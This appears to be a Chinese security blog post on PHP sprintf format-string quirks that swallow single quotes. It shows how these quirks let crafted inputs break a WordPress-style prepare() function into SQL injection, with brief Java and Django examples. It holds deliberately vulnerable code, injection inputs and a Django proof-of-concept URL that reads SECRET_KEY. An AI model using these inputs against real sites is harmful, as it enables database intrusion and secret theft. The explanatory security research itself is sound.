> 原文链接: https://www.anquanke.com//post/id/170850 


# PHP字符串格式化特点和漏洞利用点


                                阅读量   
                                **179446**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p0.ssl.qhimg.com/t01db03f4c0d2f2718f.jpg)](https://p0.ssl.qhimg.com/t01db03f4c0d2f2718f.jpg)



## PHP中的格式化字符串函数

在PHP中存在多个字符串格式化函数，分别是`printf()`、`sprintf()`、`vsprintf()`。他们的功能都大同小异。
- printf, `int printf ( string $format [, mixed $args [, mixed $... ]] )`,直接将格式化的结果输出，返回值是int。
- sprintf, `string sprintf ( string $format [, mixed $args [, mixed $... ]] )`,返回格式化字符串的结果
- vsprintf, `string vsprintf ( string $format , array $args )`,与`sprintf()`相似，不同之处在于参数是以数组的方式传入。
三者的功能类似，以下仅以`sprintf()`来说明常规的格式化字符串的方法。

单个参数格式化的方法

```
var_dump(sprintf('1%s9','monkey'));         # 格式化字符串。结果是1monkey9
var_dump(sprintf('1%d9','456'));            # 格式化数字。结果是14569
var_dump(sprintf("1%10s9",'moneky'));       # 设置格式化字符串的长度为10，如果长度不足10，则以空格代替。结果是1    moneky9(length=12)
var_dump(sprintf("1%10s9",'many monkeys')); # 设置格式化字符串的长度为10，如果长度超过10，则保持不变。结果是1many monkeys9(length=14)
var_dump(sprintf("1%'^10s9",'monkey'));     # 设置格式化字符串的长度为10，如果长度不足10，则以^代替。结果是1^^^^monkey9(length=12)
var_dump(sprintf("1%'^10s9",'monkey'));     # 设置格式化字符串的长度为10，如果长度超过10，则保持不变。结果是1many monkeys9(length=14)
```

多个参数格式化的方法

```
$num = 5;
$location = 'tree';
echo sprintf('There are %d monkeys in the %s', $num, $location);            # 位置对应，
echo sprintf('The %s contains %d monkeys', $location, $num);                # 位置对应
echo sprintf('The %2$s contains %1$d monkeys', $num, $location);            # 通过%2、%1来申明需要格式化的是第多少个参数，比如%2$s表示的是使用第二个格式化参数即$location进行格式化，同时该参数的类型是字符串类型(s表明了类型)
```

在格式化中申明的格式化参数类型有几个就说明是存在几个格式化参数，在上面的例子都是两个参数。如果是下方这种:

```
echo sprintf('The %s contains %d monkeys', 'tree');                     # 返回结果为False
```

则会出现`Too few arguments`，因为存在两个格式化参数`%s`和`%d`但仅仅只是传入了一个变量`tree`导致格式化出错返回结果为False，无法进行格式化。



## 格式化字符串的特性

除了上面的一般用法之外，格式化中的一些怪异的用法常常被人忽略，则这些恰好是漏洞的来源。

### <a class="reference-link" name="%E5%AD%97%E7%AC%A6%E4%B8%B2padding"></a>字符串padding

常规的padding默认采用的是空格方式进行填充，如果需要使用其他的字符进行填充，则需要以`%'[需要填充的字符]10s`格式来表示，如`%'#10s`表示以`#`填充，`%'$10s`表示以`$`填充

```
var_dump(sprintf("1%10s9",'monkey'));           # 使用空格进行填充
var_dump(sprintf("1%'#10s9",'monkey'));         # 使用#填充，结果是 1####monkey9
var_dump(sprintf("1%'$10s9",'monkey'));         # 使用$填充，结果是 1$$$$monkey9
```

从上面的例子看到，**在某些情况下单引号在格式化时会被吞掉，而这就有可能会埋下漏洞的隐患。**

### <a class="reference-link" name="%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%8C%89%E4%BD%8D%E7%BD%AE%E6%A0%BC%E5%BC%8F%E5%8C%96"></a>字符串按位置格式化

按位置格式化字符串的常规用法

```
$num = 5;
$location = 'tree';
var_dump(sprintf('The %2$s contains %1$d monkeys', $num, $location));
```

这种制定参数位置的格式化方法会使用到`%2$s`这种格式化的方式表示。其中`%2`表示格式化第二个参数，`$s`表示需要格式化的参数类型是字符串。如下:

```
var_dump(sprintf('%1$s-%s', 'monkey'));         # 结果是monkey-monkey
```

因为`%1$s`表示格式化第一个字符串，而后面的`%s`默认情况下同样格式化的是第一个字符串，所以最终的结果是`monkey-monkey`。如果是:

```
var_dump(sprintf('%2$s-%s', 'monkey1','monkey2'));      # 结果是monkey2-monkey1
```

因为`%2$s`格式化第二个字符串，`%s`格式化第一个字符串。

下面看一些比较奇怪的写法。首先我们需要知道在[sprintf用法](http://php.net/manual/en/function.sprintf.php)中已经说明了可以格式化的类型

[![](https://p2.ssl.qhimg.com/t010448ebf9eb43acc6.jpg)](https://p2.ssl.qhimg.com/t010448ebf9eb43acc6.jpg)

如果遇到无法识别的格式化类型呢？如：

```
var_dump(sprintf('%1$as', 'monkey'));               # 结果是s
```

由于在格式化类型中不存在`a`类型，导致格式化失败。此时`%1$a`在格式化字符串时无用就直接舍弃，最后得到的就是`s`。但是如果我们写成：

```
var_dump(sprintf('%1$a%s', 'monkey'));             # 结果是monkey
```

因为`%1$a%s`中`a`为无法识别的类型，则直接舍弃。剩下的`%s`可以继续进行格式化得到`monkey`

**那么结论就是`%1$[格式化类型]`，如果所声明的格式化类型不存在，则`%1$[格式化类型]`会被全部舍弃，留下剩下的字符。**

如果在`$`接上数字呢？如`%1$10s`呢？

```
var_dump(sprintf('%1$10s', 'monkey'));             # 结果是'    monkey' (length=10)
```

此时表示的是格式化字符串的长度，默认使用的是空格进行填充。如果需要使用其他的字符串填充呢？此时格式是`%1$'[需要填充的字符]10s`。

```
var_dump(sprintf("%1$'#10s", 'monkey'));           # 结果是 '####monkey' (length=10)
```

除此之外，还存在一些其他的奇怪的用法，如下：

```
var_dump(sprintf("%1$'%s", 'monkey'));            # 得到的结果就是 monkey
`
```

按照之前的说法，由于`'`是无法识别的类型，所以`%1$'`会被舍弃，剩余的`%s`进行格式化得到的就是`monkey`。可以发现在这种情况下`'`已经消失了。假设程序经过过滤得到的字符串是`%1$'%s'`,那么就会导致中间的`'`被吞掉，如下：

```
var_dump(sprintf("%1$'%s'", 'monkey'));        # 得到的结果是 monkey'
```



## 吞掉引号

对上面进行一个简单的总结，除了一些不常见的字符串的格式化用法之外，还存在一些吞掉引号的用法。都是处在字符串padding的情况下。

```
var_dump(sprintf("1%'#10s9",'monkey'));         # 使用#填充，结果是 1####monkey9
var_dump(sprintf("%1$'#10s", 'monkey'));           # 结果是 '####monkey' (length=10)
```

这两种`'`被吞掉的情况都有可能会引起漏洞。



## 漏洞示例

通过一段存在漏洞的代码来说明这种情况

```
$value1 = $_GET['value1'];
$value2 = $_GET['value2'];
$a = prepare("AND meta_value=%s",$value1);
$b = prepare("SELECT * FROM table WHERE key=%s $a",$value2);
function prepare($query,$args) `{`
    $query = str_replace("'%s'",'%s',$query);
    $query = str_replace('"%s"','$s',$query);
    $query = preg_replace('|(?&lt;!%)%f|','%F',$query);
    $query = preg_replace('|(?&lt;!%)%s|', "'%s'", $query);
    return @vsprintf($query,$args);
`}`
```

`$value1`和`$value2`是用户可控，函数`prepare()`会去掉格式化字符串`%s`的单引号和双引号，同时在最后加上单引号。虽然最后加上了一个`'`，但是我们还是有办法能够逃脱这个单引号。利用方式就是通过之前申明字符串填充padding的方式吞掉单引号。

### <a class="reference-link" name="%E5%88%A9%E7%94%A8%1%24%E2%80%99%s"></a>利用%1$’%s

之前已经说过`sprintf("%1$'%s", 'monkey')`就可以吞掉其中的`'`。那么在本例中，我们可以设置：

```
$value1 = '1 %1$%s (here sqli payload) --';
$value2 = '_dump';
```

此时,经过`$a = prepare("AND meta_value=%s",$value1);`，得到`$a`是`AND meta_value='1 %1$%s (here sqli payload) --'`。之后执行`$b = prepare("SELECT * FROM table WHERE key=%s $a",$value2);`，其中`$value2`是`_dump`。下面仔细分析：

[![](https://p0.ssl.qhimg.com/t01dd37ee1d7e714c0e.jpg)](https://p0.ssl.qhimg.com/t01dd37ee1d7e714c0e.jpg)

经过`$query = preg_replace('|(?&lt;!%)%s|', "'%s'", $query)`会将所有的`%s`全部变为`'%s'`，所以此时得到的`$query`是`SELECT * FROM table WHERE key='%s' AND meta_value='1 %1$'%s' (here sqli payload) --'`。

此时其中刚好存在有`1 %1$'%s`这种形式的格式化字符串，导致其中的`%1$'`会被去除，剩下`1 %s'`,此时就类似于`SELECT * FROM table WHERE key='%s' AND meta_value='1 %s' (here sqli payload) --'`，格式化`vsprintf("SELECT * FROM table WHERE key='%s' AND meta_value='1 %s' (here sqli payload) --'",_dump)`刚好闭合了前面的单引号形成SQL注入。得到的结果如下：

[![](https://p5.ssl.qhimg.com/t01c8776e27499d9ea8.jpg)](https://p5.ssl.qhimg.com/t01c8776e27499d9ea8.jpg)



## 方式二

上面利用的是`%1$'%s`，即在位置声明时出错导致吞掉单引号的方式，本方式是通过自身引入`'`与加入的单引号重合的方式。如：

```
$query = '1 %s 2';
$query = preg_replace('|(?&lt;!%)%s|', "'%s'", $query);    # 得到 1 '%s' 2'
$query = preg_replace('|(?&lt;!%)%s|', "'%s'", $query);    # 得到 1 ''%s'' 2
```

可以发现经过两次相同的过滤，最终导致`%s`逃逸出来。而在本题中的`$value1`同样是经过了两个的过滤。

所以，我们如果设置

```
$value1 = ' %s ';       # 注意%s 前后的空格
$value2 = array('_dump', '(here sqli payload) --');
```

经过`$a = prepare("AND meta_value=%s",$value1);`得到`$a`为`AND meta_value=' %s '`。其中`$value`是`array('_dump', '(here sqli payload) --')`，分析代码`$b = prepare("SELECT * FROM table WHERE key=%s $a",$value2);`。

分析执行`$query = preg_replace('|(?&lt;!%)%s|', "'%s'", $query);`之前和之后的代码：

执行之前,$query为“

[![](https://p1.ssl.qhimg.com/t01711b8dde19400e5d.jpg)](https://p1.ssl.qhimg.com/t01711b8dde19400e5d.jpg)

执行之后,$query为`SELECT * FROM table WHERE key='%s' AND meta_value=' '%s' '`

[![](https://p3.ssl.qhimg.com/t0131099891e2f41063.jpg)](https://p3.ssl.qhimg.com/t0131099891e2f41063.jpg)

可以发现所有的`%s`全部被左右全被加上了单引号，刚好与之前的单引号进行匹配，导致`AND meta_value=' '%s' '`中的`%s`逃逸出来。最后的几个就是`SELECT * FROM table WHERE key='_dump' AND meta_value=' '(here sqli payload) --' '`。

[![](https://p0.ssl.qhimg.com/t01cacb08ebaa4921c2.jpg)](https://p0.ssl.qhimg.com/t01cacb08ebaa4921c2.jpg)



## 其他

虽然本篇文章主要讨论的是PHP中的字符串漏洞，但是对于其他语言如(Java/Python)也在这里进行一个简单的讨论。(以下的例子借用的是xiaoxiong文章[wordpress 格式化字符串注入](https://superxiaoxiong.github.io/2017/11/02/wordpress-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%B3%A8%E5%85%A5/)中的例子)

### <a class="reference-link" name="Java%E6%A0%BC%E5%BC%8F%E5%8C%96"></a>Java格式化

```
StringBuilder sb = new StringBuilder();
Formatter formatter = new Formatter(sb, Locale.US);
formatter.format("%s %s %1$s", "a", "monkey");
System.out.println(formatter);
```

最后输出的结果是`a monkey a`，因为前面两个`%s`是按照顺序取，得到的是`a`和`monkey`,而后面的`%1$s`按照位置取，得到的是`a`，所以最后的结果是`a monkey a`。

如果写为:

```
StringBuilder sb = new StringBuilder();
Formatter formatter = new Formatter(sb, Locale.US);
formatter.format("%s %s '%2$c %1$s", "a", 39, "c", "d");
System.out.println(formatter);
```

最后得到的结果是`a 39 '' a`，前面两个`%s`按照顺序去得到`a`和`39`，而`%1$s`取第一个参数，得到`a`。`%2$c`取第二个参数，并且将其值作为数字得到其对应的ASCII字符，因为39对应的ASCII字符是`'`，所以`'%2$c`得到的就是`''`。

那么，我们能否借鉴PHP中的思路，吞掉`'`呢？

```
StringBuilder sb = new StringBuilder();
Formatter formatter = new Formatter(sb, Locale.US);
formatter.format("%2$'s", "a", "monkey");
System.out.println(formatter);
```

程序会出现`java.util.UnknownFormatConversionException`，无法进行类型转换的错误，所以利用Java中进行格式化的转换，目前还需要进一步的研究。

### <a class="reference-link" name="Python"></a>Python

```
def view(request, *args, **kwargs):
    template = 'Hello `{`user`}`, This is your email: ' + request.GET.get('email')
    return HttpResponse(template.format(user=request.user))

poc:
http://localhost:8000/?email=`{`user.groups.model._meta.app_config.module.admin.settings.SECRET_KEY`}`
http://localhost:8000/?email=`{`user.user_permissions.model._meta.app_config.module.admin.settings.SECRET_KEY`}`
```

这个代码是基于Django的环境下的存在漏洞的代码。通过第一次格式化改变了语句结构，第二次格式化进行赋值。由于平时对Django接触得比较少，所以这个代码理解得还不是很透，需要进一步的实践才能够知道。



## 总结

看似一些正常功能的函数在某些特殊情况下恰好能够为埋下漏洞的隐患，而字符串格式化刚好就是一个这样的例子，也从侧面说明了安全需要猥琐呀。



## 参考

[https://superxiaoxiong.github.io/2017/11/02/wordpress-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%B3%A8%E5%85%A5/](https://superxiaoxiong.github.io/2017/11/02/wordpress-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%B3%A8%E5%85%A5/)
